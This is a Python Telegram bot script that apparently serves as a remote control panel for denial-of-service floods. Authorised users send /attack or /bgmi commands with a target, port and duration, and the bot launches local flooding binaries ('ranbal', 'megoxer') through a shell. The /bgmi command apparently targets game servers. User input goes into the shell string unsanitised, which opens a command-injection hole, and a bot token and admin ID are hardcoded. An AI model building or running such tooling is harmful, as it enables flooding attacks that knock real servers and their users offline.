import telebot 
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('8199835901:AAH4BUL3F1Uec4S4_l3qJKJwAaSlDp1cSQY')

# Admin user IDs
admin_id = {"5980035995"}

# File to store allowed user IDs
USER_FILE = "users.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to handle the reply when free users run the /attack
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"ATTACK ON : {port} for {time}s "
    bot.reply_to(message, response)

attack_running = False

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global attack_running

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Already Running. Please Wait."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer

            if time > 600:
                response = "Enter Time Less Than 600"
            else:
                attack_running = True  # Set the attack state to running
                try:
                    start_attack_reply(message, target, port, time)
                    # Simulate attack process
                    full_command = f"./ranbal {target} {port} {time} 900"
                    subprocess.run(full_command, shell=True)

                    response = "ATTACK COMPLETED."
                except Exception as e:
                    response = f"Error during attack: {str(e)}"
                finally:
                    attack_running = False  # Reset the attack state
        else:
            response = "Usage: /attack <target> <port> <time>"
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    global attack_running

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Already Running. Please Wait."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer

            if time > 240:
                response = "Enter Time Less Than 240"
            else:
                attack_running = True  # Set the attack state to running
                try:
                    start_attack_reply(message, target, port, time)
                    # Simulate attack process
                    full_command = f"./megoxer {target} {port} {time} 1300"
                    subprocess.run(full_command, shell=True)

                    response = "ATTACK COMPLETED."
                except Exception as e:
                    response = f"Error during attack: {str(e)}"
                finally:
                    attack_running = False  # Reset the attack state
        else:
            response = "Usage: /bgmi <target> <port> <time>"
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
